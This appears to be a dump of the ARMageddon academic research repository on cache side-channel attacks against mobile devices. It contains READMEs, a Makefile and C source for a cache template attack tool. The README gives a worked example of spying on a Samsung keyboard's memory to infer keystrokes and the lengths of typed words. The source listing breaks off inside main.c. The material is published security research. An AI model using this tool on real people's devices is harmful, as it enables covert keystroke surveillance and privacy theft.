Project Path: arc_IAIK_armageddon_olrh3yw6

Source Tree:

```txt
arc_IAIK_armageddon_olrh3yw6
├── README.md
├── cache_template_attacks
│   ├── LICENSE
│   ├── Makefile
│   ├── README.md
│   ├── cache_template_attack
│   │   ├── calibrate.c
│   │   ├── calibrate.h
│   │   ├── configuration.h
│   │   ├── lock.c
│   │   ├── lock.h
│   │   ├── main.c
│   │   └── threads.h
│   ├── colors.mk
│   ├── common.mk
│   ├── config-arm.mk
│   ├── config-arm64.mk
│   ├── config.mk
│   └── images
│       └── keyboard_sentence.png
├── eviction_strategy_evaluator
│   ├── LICENSE
│   ├── README.md
│   ├── eviction_strategy_evaluator
│   │   ├── __init__.py
│   │   ├── build.py
│   │   ├── config.py
│   │   ├── evaluate.py
│   │   ├── executor.py
│   │   ├── log.py
│   │   ├── main.py
│   │   ├── source
│   │   │   ├── Makefile
│   │   │   └── main.c
│   │   ├── strategy.py
│   │   ├── templates
│   │   │   └── strategy.jinja2
│   │   └── utils.py
│   ├── setup.cfg
│   └── setup.py
├── input_simulator
│   ├── Makefile
│   ├── README.md
│   ├── colors.mk
│   ├── common.mk
│   ├── config-arm.mk
│   ├── config-arm64.mk
│   ├── config.mk
│   └── input-simulator
│       ├── key-mapping.c
│       ├── key-mapping.h
│       ├── main.c
│       ├── simulator.c
│       └── simulator.h
└── libflush
    ├── Android.mk
    ├── Application.mk
    ├── LICENSE
    ├── Makefile
    ├── README.md
    ├── colors.mk
    ├── common.mk
    ├── config-arm.mk
    ├── config-arm64.mk
    ├── config.mk
    ├── doc
    │   ├── Doxyfile
    │   ├── Makefile
    │   ├── api.rst
    │   ├── conf.py
    │   ├── config.mk
    │   ├── example.rst
    │   ├── index.rst
    │   ├── installation.rst
    │   ├── requirements.txt
    │   └── usage.rst
    ├── example
    │   ├── Android.mk
    │   ├── Application.mk
    │   ├── Makefile
    │   ├── config-arm.mk
    │   ├── config.mk
    │   └── main.c
    ├── libflush
    │   ├── armv7
    │   │   ├── configuration.h
    │   │   ├── internal.h
    │   │   ├── libflush.c
    │   │   ├── libflush.h
    │   │   ├── memory.h
    │   │   └── timing.h
    │   ├── armv8
    │   │   ├── flush.h
    │   │   ├── internal.h
    │   │   ├── libflush.c
    │   │   ├── libflush.h
    │   │   ├── memory.h
    │   │   └── timing.h
    │   ├── eviction
    │   │   ├── configuration.h
    │   │   ├── eviction.c
    │   │   ├── eviction.h
    │   │   └── strategies
    │   │       ├── alto45.h
    │   │       ├── bacon.h
    │   │       ├── default.h
    │   │       ├── hammerhead.h
    │   │       ├── mako.h
    │   │       ├── manta.h
    │   │       ├── tilapia.h
    │   │       └── zeroflte.h
    │   ├── internal.h
    │   ├── libflush.c
    │   ├── libflush.h
    │   ├── timing.c
    │   ├── timing.h
    │   ├── utils.c
    │   ├── version.h.in
    │   └── x86
    │       ├── flush.h
    │       ├── libflush.h
    │       ├── memory.h
    │       └── timing.h
    ├── libflush.pc.in
    └── tests
        ├── Makefile
        ├── config.mk
        ├── eviction.c
        ├── memory.c
        ├── prefetch.c
        ├── session.c
        ├── tests.c
        ├── timing.c
        └── utils.c

```

`README.md`:

```md
# ARMageddon: Cache Attacks on Mobile Devices

This repository contains several libraries and tools to perform cache-attacks on
the mobile devices. The published code has been used to perform the most
powerful cross-core cache attacks [Prime+Probe](https://eprint.iacr.org/2005/271.pdf), [Flush+Reload](https://eprint.iacr.org/2013/448.pdf), [Evict+Reload](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-gruss.pdf), [Flush+Flush](http://arxiv.org/abs/1511.04594) on non-rooted ARM-based devices without any privileges.

We have developed this libraries and tools in the [ARMageddon: Cache Attacks on Mobile Devices](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp) paper and used it to build covert-channels that outperform state-of-the-art covert channels on Android by several orders of magnitude. We utilized it to implement [cache template attacks](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-gruss.pdf) that monitor tap and swipe events as well as keystrokes, and even derive the words entered on the touchscreen. Moreover, we used it to attack cryptographic primitives in Java and to monitor cache activity in the ARM TrustZone from the normal world.

The [ARMageddon: Cache Attacks on Mobile Devices](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp) paper by Lipp, Gruss, Spreitzer, Maurice and Mangard has be published at the Usenix Security Symposium 2016 and presented at [Black Hat Europe 2016](https://www.blackhat.com/eu-16/briefings/schedule/index.html#armageddon-how-your-smartphone-cpu-breaks-software-level-security-and-privacy-4887).

## Repository Content

| Project  | Description |
| -------- | ------------- |
| [libflush](libflush) | Library to build cross-platform cache attacks |
| [Cache Template Attacks](cache_template_attacks) | Cross-platform implementation of Cache Template Attacks |
| [Eviction Strategy Evaluator](eviction_strategy_evaluator) | Find eviction strategy for your device |
| [Input Simulator](input_simulator) | Simple tool to simulate touch events |

## References

* [1] [ARMageddon: Cache Attacks on Mobile Devices - Lipp, Gruss, Spreitzer, Maurice, Mangard](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp)
* [2] [ARMageddon: How Your Smartphone CPU Breaks Software-Level Security and Privacy (Black Hat Europe 2016) - Lipp, Maurice](https://www.blackhat.com/eu-16/briefings/schedule/index.html#armageddon-how-your-smartphone-cpu-breaks-software-level-security-and-privacy-4887)

```

`cache_template_attacks/LICENSE`:

```
Copyright (c) 2015-2016 Moritz Lipp

This software is provided 'as-is', without any express or implied
warranty. In no event will the authors be held liable for any damages
arising from the use of this software.

Permission is granted to anyone to use this software for any purpose,
including commercial applications, and to alter it and redistribute it
freely, subject to the following restrictions:

   1. The origin of this software must not be misrepresented; you must not
   claim that you wrote the original software. If you use this software
   in a product, an acknowledgment in the product documentation would be
   appreciated but is not required.

   2. Altered source versions must be plainly marked as such, and must not be
   misrepresented as being the original software.

   3. This notice may not be removed or altered from any source
   distribution.

```

`cache_template_attacks/Makefile`:

```
# See LICENSE file for license and copyright information

include config.mk
include colors.mk
include common.mk

SOURCE = $(wildcard ${PROJECT}/*.c)

ifneq ($(wildcard ${VALGRIND_SUPPRESSION_FILE}),)
VALGRIND_ARGUMENTS += --suppressions=${VALGRIND_SUPPRESSION_FILE}
endif

OBJECTS       = $(addprefix ${BUILDDIR_RELEASE}/,${SOURCE:.c=.o})
OBJECTS_DEBUG = $(addprefix ${BUILDDIR_DEBUG}/,${SOURCE:.c=.o})

ifeq "${ARCH}" "armv7"
	include config-arm.mk
	CPPFLAGS += -DARM_DEVICE
endif

ifeq "${ARCH}" "armv8"
	include config-arm64.mk
	CPPFLAGS += -D__ARM_ARCH_8A__
endif

ifneq (${WITH_THREADS}, 0)
CPPFLAGS += -DWITH_THREADS
LIBS += -pthread
endif

ifneq (${WITH_ANDROID}, 0)
CPPFLAGS += -DWITH_ANDROID
endif

all: options ${PROJECT}

# pkg-config based version checks
.version-checks/%: config.mk
	$(QUIET)test $($(*)_VERSION_CHECK) -eq 0 || \
		${PKG_CONFIG} --atleast-version $($(*)_MIN_VERSION) $($(*)_PKG_CONFIG_NAME) || ( \
		echo "The minimum required version of $(*) is $($(*)_MIN_VERSION)" && \
		false \
	)
	@mkdir -p .version-checks
	$(QUIET)touch $@

options:
	@echo ${PROJECT} build options:
	@echo "CFLAGS  = ${CFLAGS}"
	@echo "LIBS    = ${LIBS}"
	@echo "DFLAGS  = ${DFLAGS}"
	@echo "CC      = ${CC}"

# release build

${OBJECTS}: config.mk .version-checks/LIBFLUSH

${BUILDDIR_RELEASE}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $@)
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} -o $@ $< -MMD -MF ${DEPENDDIR}/$@.dep

${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}: ${OBJECTS}
	$(call colorecho,CC,$@)
	@mkdir -p ${BUILDDIR_RELEASE}/${BINDIR}
	$(QUIET)${CC} ${SFLAGS} ${LDFLAGS} \
		-o ${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT} ${OBJECTS} ${LIBS}

${PROJECT}: ${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}

release: ${PROJECT}

run: release
	$(QUIET)./${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT}

# debug build

${OBJECTS_DEBUG}: config.mk .version-checks/LIBFLUSH

${BUILDDIR_DEBUG}/%.o: %.c
	$(call colorecho,CC,$<)
	@mkdir -p ${DEPENDDIR}/$(dir $@)
	@mkdir -p $(dir $(abspath $@))
	$(QUIET)${CC} -c ${CPPFLAGS} ${CFLAGS} ${DFLAGS} \
		-o $@ $< -MMD -MF ${DEPENDDIR}/$@.dep

${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}: ${OBJECTS_DEBUG}
	$(call colorecho,CC,$@)
	@mkdir -p ${BUILDDIR_DEBUG}/${BINDIR}
	$(QUIET)${CC} ${LDFLAGS} \
		-o ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT} ${OBJECTS_DEBUG} ${LIBS}

debug: ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

run-debug: debug
	$(QUIET)./${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

# clean

clean:
	$(QUIET)rm -rf \
		${BUILDDIR} \
		${DEPENDDIR} \
		${TARFILE} \
		${TARDIR} \

valgrind: debug
	 $(QUIET)G_SLICE=always-malloc G_DEBUG=gc-friendly ${VALGRIND} ${VALGRIND_ARGUMENTS} \
		 ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

gdb: debug
	$(QUIET)cgdb ${BUILDDIR_DEBUG}/${BINDIR}/${PROJECT}

dist: clean
	$(QUIET)tar -czf $(TARFILE) --exclude=.gitignore \
		--transform 's,^,${PROJECT}-$(VERSION)/,' \
		`git ls-files`

install: all
	$(call colorecho,INSTALL,"executeable file")
	$(QUIET)mkdir -m 755 -p ${DESTDIR}${PREFIX}/bin
	$(QUIET)install -m 755 ${BUILDDIR_RELEASE}/${BINDIR}/${PROJECT} ${DESTDIR}${PREFIX}/bin

uninstall:
	$(ECHO) removing executable file
	$(call colorecho,UNINSTALL,"executeable")
	$(QUIET)rm -f ${DESTDIR}${PREFIX}/bin/${PROJECT}

DEPENDS = ${DEPENDDIRS:^=${DEPENDDIR}/}$(addprefix ${DEPENDDIR}/,${OBJECTS:.o=.o.dep})
-include ${DEPENDS}

.PHONY: all options clean doc debug valgrind gdb dist install uninstall

```

`cache_template_attacks/README.md`:

```md
# Cache Template Attacks

Cache Template Attacks is a platform-independent tool that utilizes [libflush](../libflush) to launch [cache template attacks](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-gruss.pdf) on x86 as well as ARMv7 and ARMv8 architecture. We used it to monitor tap and swipe events as well as keystrokes, and even derive the words entered on the touchscreen on mobile devices.

The [ARMageddon: Cache Attacks on Mobile Devices](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp) paper by Lipp, Gruss, Spreitzer, Maurice and Mangard has been published at the Usenix Security Symposium 2016 and presented at [Black Hat Europe 2016](https://www.blackhat.com/eu-16/briefings/schedule/index.html#armageddon-how-your-smartphone-cpu-breaks-software-level-security-and-privacy-4887).

## Table of content

- [Installation](#installation)
    - [Dependencies](#dependencies)
- [Build Configuration](#build-configuration)
- [Usage](#usage)
- [Example](#example)
- [License](#license)
- [References](#references)

## Installation

The tool is shipped with a Makefile and can be compiled by running:
```bash
make
```

The tool can be installed on the host system:
```bash
make install
```

In addition we provide a debug build that can be initiated by calling `make debug`.

### Dependencies
Cache Template Attacks utilizes libflush and, thus, this is the only dependency.

* [libflush](../libflush) (required)

However, by default it uses the toolchains provided by the Android NDK if built
for _armv7_ or _armv8_.

* [Android NDK](https://developer.android.com/ndk/index.html) - Android Native
    Development Kit (optional, for ARM builds)

## Build Configuration

The build system makes use of several configuration files. The parameters can be adjusted by modifying the files accordingly or by passing them to make (`make ARCH=x86`). The most important properties are the following:

* `ARCH`: Defines the target architecture.
    * _x86_ (default) - Support for _i386_ and _x86_64_
    * _armv7_ - Support for ARMv7
    * _armv8_ - Support for ARMv8
* `WITH_THREADS`: If the thread-based implementation should be used.
* `WITH_ANDROID`: If it is build for an Android device and ashmem has to be used.

If the library is build for the ARMv7 or the ARMv8 architecture the build system uses the [config-arm.mk](config-arm.mk) or [config-arm64.mk](config-arm64.mk) configuration file. By default the build system makes use of the toolchains provided by the [Android NDK](https://developer.android.com/ndk/index.html), thus its possible that the installation path of the NDK needs to be modified:

* `ANDROID_NDK_PATH`: Path to the installation of the Android NDK.
    * _/opt/android-ndk_ (default)
* `ANDROID_PLATFORM`: Defines the used Android platform that is used.
    * _android-21_ (default)

If you prefer to use a different toolchain/compiler, feel free to change `CC` and other properties accordingly.

## Usage

```bash
cache_template_attack [OPTIONS] <library>
```

The following options are available:

* **-r, -range**

    The range of addresses that should be scanned.
    (Example: *7f9783a000-7f9804d000*)

* **-o, -offset**

    The offset where the scan process should start.
    (Example: *0x920000*)

* **-f, -fork**

    The number of spy processes that should be created.
    (Default: *1*)

* **-t, -threshold**

    The threshold that is used to distinguish between a cache hit and a cache
    miss. If no value has been passed, a calibration process will figure out a
    threshold.

* **-n, -number-of-tests**

    The number of tests that are executed for each address.
    Default: *1000*

* **-u, -offset-update-time**

    The time in seconds before the master thread will update the offset that is
    used to spy on.
    Default: *1*

* **-c, -cpu**

    Bind to CPU.
    Default: *0*

* **-s, -spy**

    If the tool should only spy on a single address that is defined by the
    offset parameter.

* **-z, -show-timing**

    If the tool should print a timing information instead of the number of cache hits
    that it has detected. This is a convenient option to create traces of the
    usage over time.

* **-l, -logfile**

    If the tool should log the results in form of a CSV file.

* **-h, -help**

    Show the help information.

## Example

As an example you can use this tool to find addresses of a keyboard that are
triggered by certain events. For instance, you want to spy on the Samsung
Keyboard that is the default keyboard on the Samsung Galaxy S6 and want to find
addresses that are activated if the user presses any letter on the alphabet.

By inspecting the ``/proc/<pid>/maps`` file, one can get knowledge about which
files are mapped by the victim process. In the above example, we find the
following entries that describe a region of contiguous virtual memory mapped to
the ``SamsungIMEv2.odex`` file:

    7f971c6000-7f9783a000 r--p 00000000 08:0f 49066 /system/app/SamsungIMEv2/arm64/SamsungIMEv2.odex
    7f9783a000-7f9804d000 r-xp 00674000 08:0f 49066 /system/app/SamsungIMEv2/arm64/SamsungIMEv2.odex
    7f9804d000-7f9804e000 rw-p 00e87000 08:0f 49066 /system/app/SamsungIMEv2/arm64/SamsungIMEv2.odex
    7faaee1000-7faaee2000 r--p 00000000 08:0f 49066 /system/app/SamsungIMEv2/arm64/SamsungIMEv2.odex

We can use this information and pass it to our ``cache_template_attack`` tool:

    cache_template_attack -c 0 -r 7f9783a000-7f9804d000 -o 00674000 -t 230 -f 1 /system/app/SamsungIMEv2/arm64/SamsungIMEv2.odex

In parallel we need to simulate the event by either manually pressing on the
keyboard on the touchscreen or automating this process.

If the spy process detects cache hits on the address it currently spies on, it
will print it. In addition, you could save the file to a logfile which helps
evaluating your results.

     0x3d300 - 5
     0x3d300 - 11
     0x3d300 - 14
     0x3d300 - 23
     0x3d340 - 1
     0x3d340 - 2
     0x3d340 - 2
     0x3d340 - 2

If you have identified addresses that are triggered by certain events, you can
use the tool to spy just on them. In our example. we identified an address
that is triggered if the user pressed a letter on the screen and one that helps
us to decide if he pressed the space bar. Using only those two addresses, we are
now capable of deriving the length of the words the user typed into the phone:

![Spy on the Keyboard](./images/keyboard_sentence.png)

## License

[Licensed](LICENSE) under the zlib license.

## References

* [1] [ARMageddon: Cache Attacks on Mobile Devices (USENIX Security 2016) - Lipp, Gruss, Spreitzer, Maurice, Mangard](https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/lipp)
* [2] [ARMageddon: How Your Smartphone CPU Breaks Software-Level Security and Privacy (Black Hat Europe 2016) - Lipp, Maurice](https://www.blackhat.com/eu-16/briefings/schedule/index.html#armageddon-how-your-smartphone-cpu-breaks-software-level-security-and-privacy-4887)
* [3] [Cache Template Attacks: Automating Attacks on Inclusive Last-Level Caches (USENIX Security 2015) - Gruss, Spreitzer, Mangard](https://www.usenix.org/node/191011)

```

`cache_template_attacks/cache_template_attack/calibrate.c`:

```c
 /* See LICENSE file for license and copyright information */

#include <inttypes.h>
#include <sched.h>
#include <libflush/libflush.h>

#include "calibrate.h"

#define MIN(a, b) ((a) > (b)) ? (b) : (a)

uint64_t calibrate(libflush_session_t* libflush_session)
{
  char buffer[4096] = {0};
  void* address = &buffer[1024];

  // Measure time it takes to access something from the cache
  size_t hit_histogram[CALIBRATION_HISTOGRAM_SIZE] = {0};
  libflush_access_memory(address);

  for (unsigned int i = 0; i < CALIBRATION_HISTOGRAM_ENTRIES; i++) {
      uint64_t time = libflush_reload_address(libflush_session, address);
      hit_histogram[MIN(CALIBRATION_HISTOGRAM_SIZE - 1, time / CALIBRATION_HISTOGRAM_SCALE)]++;
      sched_yield();
  }

  // Measure time it takes to access something from memory
  size_t miss_histogram[CALIBRATION_HISTOGRAM_SIZE] = {0};
  for (unsigned int i = 0; i < CALIBRATION_HISTOGRAM_ENTRIES; i++) {
      uint64_t time = libflush_reload_address_and_flush(libflush_session, address);
      miss_histogram[MIN(CALIBRATION_HISTOGRAM_SIZE - 1, time / CALIBRATION_HISTOGRAM_SCALE)]++;
      sched_yield();
  }

  // Get the maximum value of a cache hit and the minimum value of a cache miss
  size_t hit_maximum_index = 0;
  size_t hit_maximum = 0;

  size_t miss_minimum_index = 0;
  size_t miss_maximum = 0;
  size_t miss_maximum_index = 0;

  for (int i = 0; i < CALIBRATION_HISTOGRAM_SIZE; i++) {
      if (hit_maximum < hit_histogram[i]) {
          hit_maximum = hit_histogram[i];
          hit_maximum_index = i;
      }

      if (miss_maximum < miss_histogram[i]) {
          miss_maximum = miss_histogram[i];
          miss_maximum_index = i;
      }

      if (miss_histogram[i] > CALIBRATION_HISTOGRAM_THRESHOLD && miss_minimum_index == 0) {
          miss_minimum_index = i;
      }
  }

  uint64_t cache = hit_maximum_index * CALIBRATION_HISTOGRAM_SCALE;
  uint64_t mem = miss_maximum_index * CALIBRATION_HISTOGRAM_SCALE;
  uint64_t threshold = mem - (mem - cache) / 2;

  return threshold;
}

```

`cache_template_attacks/cache_template_attack/calibrate.h`:

```h
 /* See LICENSE file for license and copyright information */

#ifndef CALIBRATE_H
#define CALIBRATE_H

#include <libflush/libflush.h>

#define CALIBRATION_HISTOGRAM_SIZE 200
#define CALIBRATION_HISTOGRAM_ENTRIES 100000
#define CALIBRATION_HISTOGRAM_SCALE 5
#define CALIBRATION_HISTOGRAM_THRESHOLD 100

uint64_t calibrate(libflush_session_t* libflush_session);

#endif  /*CALIBRATE_H*/

```

`cache_template_attacks/cache_template_attack/configuration.h`:

```h
 /* See LICENSE file for license and copyright information */

#ifndef CONFIGURATION_H
#define CONFIGURATION_H

#define LOCK_ROUND_ROBIN 0
#define BIND_TO_CPU 0
#define NUMBER_OF_YIELDS 1
#define OFFSET_UPDATE_TIME (0.5 * 1000 * 1000)
#define NUMBER_OF_TESTS 1000
#define SHOW_TIMING false

#endif  /*CONFIGURATION_H*/

```

`cache_template_attacks/cache_template_attack/lock.c`:

```c
/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include "configuration.h"
#include "lock.h"

#include <unistd.h>
#include <stdio.h>
#include <sched.h>
#include <string.h>

#if LOCK_ROUND_ROBIN == 1
static unsigned int fork_idx = 0;
#endif

inline void tal_init(lock_t* lock, lock_attr_t* attr)
{
  /* Set attributes */
  if (attr != NULL) {
    memcpy(&(lock->attr), attr, sizeof(lock_attr_t));
  }

#ifdef WITH_POSIX_THREAD_PROCESS_SHARED
  if (pthread_mutexattr_init(&(lock->mtx_attr)) != 0) {
    fprintf(stderr, "Error: Could not init mutexattr\n");
  }

  if (pthread_mutexattr_setpshared(&(lock->mtx_attr), PTHREAD_PROCESS_SHARED) != 0) {
    fprintf(stderr, "Error: Could not set pshared\n");
  }

  if (pthread_mutex_init(&(lock->mtx), &(lock->mtx_attr)) != 0) {
    fprintf(stderr, "Error: Could not initalize mutex\n");
  }
#else
#if LOCK_ROUND_ROBIN == 1
  fork_idx = attr->fork_idx;
  lock->current_idx = fork_idx;
#else
  atomic_flag_clear(&(lock->cat));
#endif
#endif
}

inline void tal_lock(lock_t* lock)
{
#ifdef WITH_POSIX_THREAD_PROCESS_SHARED
  if (pthread_mutex_lock(&(lock->mtx)) != 0) {
    fprintf(stderr, "Error: Could not lock\n");
  }
#else
#if LOCK_ROUND_ROBIN == 1
  while (lock->current_idx != fork_idx) {
    sched_yield();
  }
#else
  while (atomic_flag_test_and_set(&lock->cat)) {
    sched_yield();
  };
#endif
#endif
}

inline void tal_unlock(lock_t* lock)
{
#ifdef WITH_POSIX_THREAD_PROCESS_SHARED
  if (pthread_mutex_unlock(&(lock->mtx)) != 0) {
    fprintf(stderr, "Error: Could not unlock\n");
  }
#else
#if LOCK_ROUND_ROBIN == 1
  lock->current_idx = (fork_idx + 1) % lock->attr.number_of_forks;
  sched_yield();
#else
  atomic_flag_clear(&(lock->cat));
  sched_yield();
#endif
#endif
}

```

`cache_template_attacks/cache_template_attack/lock.h`:

```h
 /* See LICENSE file for license and copyright information */

#ifndef LOCK_H
#define LOCK_H

#include <stdatomic.h>
#include <stdbool.h>
#include <pthread.h>

#include "configuration.h"

#ifdef WITH_POSIX_THREAD_PROCESS_SHARED
#ifndef _POSIX_THREAD_PROCESS_SHARED
#error This system does not support process shared mutex
#endif
#endif

typedef struct lock_attr_s {
#if LOCK_ROUND_ROBIN == 1
  unsigned int number_of_forks;
  unsigned int fork_idx;
#else
  void* x;
#endif
} lock_attr_t;

typedef struct lock_s {
#ifdef WITH_POSIX_THREAD_PROCESS_SHARED
  pthread_mutex_t mtx;
  pthread_mutexattr_t mtx_attr;
#else
#if LOCK_ROUND_ROBIN == 1
  atomic_uint current_idx;
#else
  volatile atomic_flag cat;
#endif

  lock_attr_t attr;
#endif
} lock_t;

void tal_init(lock_t* lock, lock_attr_t* attr);
void tal_lock(lock_t* lock);
void tal_unlock(lock_t* lock);

#endif  /*LOCK_H*/

```

`cache_template_attacks/cache_template_attack/main.c`:

```c
 /* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <getopt.h>
#include <inttypes.h>
#include <sched.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>

#include <libflush/libflush.h>

#include "configuration.h"
#include "lock.h"

#ifdef WITH_THREADS
#include <pthread.h>
#include "threads.h"
#else
#ifndef WITH_ANDROID
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#else
#include <linux/ashmem.h>
#endif

static int shared_data_shm_fd = 0;
#endif

#include "calibrate.h"

#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))

/* Forward declarations */
static void attack_master(size_t range, bool spy, useconds_t
    offset_update_time);
static void attack_slave(libflush_session_t* libflush_session, uint8_t* m,
    size_t threshold, size_t offset, size_t number_of_tests, bool show_timing,
    FILE* logfile);

/* Shared data */
typedef struct shared_data_s {
  unsigned int current_offset;
  lock_t lock;
} shared_data_t;

static shared_data_t* shared_data = NULL;

#ifdef WITH_THREADS
static shared_data_t shared_data_tmp;
void* attack_thread(void* ptr);
#endif

static void
print_help(char* argv[]) {
  fprintf(stdout, "Usage: %s [OPTIONS] <library>\n", argv[0]);
  fprintf(stdout, "Application Options:\n");
  fprintf(stdout, "\t-r, -range <range>\t Address range\n");
  fprintf(stdout, "\t-o, -offset <offset>\t Offset\n");
  fprintf(stdout, "\t-f, -fork <value>\t Fork value times\n");
  fprintf(stdout, "\t-t, -threshold <value>\t Threshold\n");
  fprintf(stdout, "\t-n, -number-of-tests <value>\t Number of tests per address\n");
  fprintf(stdout, "\t-u, -offset-update-time <value>\t Interval in seconds to update the offset\n");
  fprintf(stdout, "\t-c, -cpu <value>\t Bind to cpu\n");
  fprintf(stdout, "\t-s, -spy\t Spy mode\n");
  fprintf(stdout, "\t-z, -show-timing\t Show timing information\n");
  fprintf(stdout, "\t-l, -logfile <value>\t Logfile in csv format\n");
  fprintf(stdout, "\t-h, -help\t Help page\n");
}

int main(int argc, char* argv[])
{
  /* Define parameters */
  char* filename = NULL;
  size_t offset  = 0;
  size_t range   = 0;
  size_t threshold = 0;
  size_t number_of_forks = 1;
  int cpu = BIND_TO_CPU;
  useconds_t offset_update_time = OFFSET_UPDATE_TIME;
  size_t number_of_tests = NUMBER_OF_TESTS;
  bool spy = false;
  bool show_timing = SHOW_TIMING;
  FILE* logfile = NULL;

  /* Parse arguments */
  static const char* short_options = "o:r:f:t:c:u:n:l:szh";
  static struct option long_options[] = {
    {"offset",                required_argument, NULL, 'o'},
    {"range",                 required_argument, NULL, 'r'},
    {"fork",                  required_argument, NULL, 'f'},
    {"threshold",             required_argument, NULL, 't'},
    {"cpu",                   required_argument, NULL, 'c'},
    {"number-of-tests",       required_argument, NULL, 'n'},
    {"offset-update-time",    required_argument, NULL, 'u'},
    {"logfile",               required_argument, NULL, 'l'},
    {"spy",                   no_argument, NULL, 's'},
    {"show-timing",           no_argument, NULL, 'z'},
    {"help",                  no_argument, NULL, 'h'},
    { NULL,                   0, NULL, 0}
  };

  opterr = 0;

  int c;
  while ((c = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
    switch (c) {
      case 'o':
        {
          long unsigned int offset_p = 0;
          if (!sscanf(optarg,"%lx",&offset_p)) {
            fprintf(stderr, "Could not parse offset parameter: %s\n", optarg);
            return -1;
          }

          offset = (size_t) offset_p;
        }
        break;
      case 'r':
        {
          void* start = NULL;
          void* end   = NULL;
          if (!sscanf(optarg, "%p-%p", &start, &end)) {
            fprintf(stderr, "Could not parse range parameter: %s\n", optarg);
            return -1;
          }

          range = (size_t) end - (size_t) start;
        }
        break;
      case 'f':
        if (!sscanf(optarg,"%zu", &number_of_forks)) {
          fprintf(stderr, "Could not parse fork parameter: %s\n", optarg);
          return -1;
        }
        break;
      case 't':
        {
          if (!sscanf(optarg,"%zu", &threshold)) {
            fprintf(stderr, "Could not parse threshold parameter: %s\n", optarg);
            return -1;
          }
        }
        break;
      case 'c':
        cpu = atoi(optarg);
        break;
      case 'n':
        number_of_tests = atoi(optarg);
        break;
      case 'u':
        {
          float offset_update_time_seconds;
          if (!sscanf(optarg,"%f", &offset_update_time_seconds)) {
            fprintf(stderr, "Could not parse offset-update-time parameter: %s\n", optarg);
            return -1;
          }

          offset_update_time = offset_update_time_seconds * 1000 * 1000;
        }
        break;
      case 'l':
        logfile = fopen(optarg, "w+");
        if (logfile == NULL) {
          fprintf(stderr, "Error: Could not open logfile '%s'\n", optarg);
          return -1;
        }
        break;
      case 's':
        spy = true;
        break;
      case 'z':
        show_timing = true;
        break;
      case 'h':
        print_help(argv);
        return 0;
      case ':':
        fprintf(stderr, "Error: option `-%c' requires an argument\n", optopt);
        break;
      case '?':
      default:
        fprintf(stderr, "Error: Invalid option '-%c'\n", optopt);
        return -1;
    }
  }

  /* Validate parameters */
  if (optind >= argc) {
    fprintf(stderr, "Error: No library passed\n");
    return 0;
  }

  filename = argv[optind];

  if (logfile != NULL) {
    if (show_timing == false) {
      fprintf(logfile, "Offset,Hits\n");
    } else {
      fprintf(logfile, "Time,Offset,Reload\n");
    }
  }

  /* Setup shared memory */
#ifdef WITH_THREADS
  shared_data = &shared_data_tmp;
#else
#ifdef WITH_ANDROID
  shared_data_shm_fd = open("/" ASHMEM_NAME_DEF, O_RDWR);
  if (shared_data_shm_fd < 0) {
    fprintf(stderr, "Error: Could not create shared memory.\n");
    return -1;
  }
  ioctl(shared_data_shm_fd, ASHMEM_SET_NAME, "shared_data");
  ioctl(shared_data_shm_fd, ASHMEM_SET_SIZE, sizeof(shared_data));

  shared_data = mmap(NULL, sizeof(shared_data), PROT_READ | PROT_WRITE,
      MAP_SHARED, shared_data_shm_fd, 0);
  if (shared_data == MAP_FAILED) {
    fprintf(stderr, "Error: Could not map shared memory.\n");
    return -1;
  }
#else
  /* Create shared memory for current offset */
  shared_data_shm_fd = shmget(IPC_PRIVATE, sizeof(shared_data_t), IPC_CREAT | SHM_R | SHM_W);
  if (shared_data_shm_fd == -1) {
    fprintf(stderr, "Error: Could not get shared memory segment.\n");
    return -1;
  }

  shared_data = shmat(shared_data_shm_fd, NULL, 0);
  if (shared_data == (void*) -1) {
    fprintf(stderr, "Error: Could not attach shared memory.\n");
    return -1;
  }
#endif
#endif

  if (shared_data == NULL) {
    fprintf(stderr, "Error: Implementation error: shared_data is not set.\n");
    return -1;
  }

  tal_unlock(&(shared_data->lock));

  /* Initialize libflush */
  libflush_session_t* libflush_session;
  libflush_init(&libflush_session, NULL);

  /* Open file */
  int fd = open(filename, O_RDONLY);
  if (fd == -1) {
    fprintf(stderr, "Could not open file: %s\n", filename);
    return -1;
  }

  /* If no range is given, map the whole file */
  if (range == 0) {
    struct stat filestat;
    if (fstat(fd, &filestat) == -1) {
      fprintf(stderr, "Error: Could not obtain file information.\n");
      return -1;
    }

    range = filestat.st_size;
  }

  /* Map file */
  uint8_t* m = (uint8_t*) mmap(0, range + offset, PROT_READ, MAP_SHARED, fd, 0);
  if (m == NULL) {
    fprintf(stderr, "Could not map file: %s\n", filename);
    return -1;
  }
  offset = offset & ~(0x3F);
  m += offset;

  /* Start calibration */
  if (threshold == 0) {
    fprintf(stdout, "[x] Start calibration... ");
    threshold = calibrate(libflush_session);
    fprintf(stdout, "%zu\n", threshold);
  }

  /* Start cache template attack */
  fprintf(stdout, "[x] Filename: %s\n", filename);
  fprintf(stdout, "[x] Offset: %zu\n", offset);
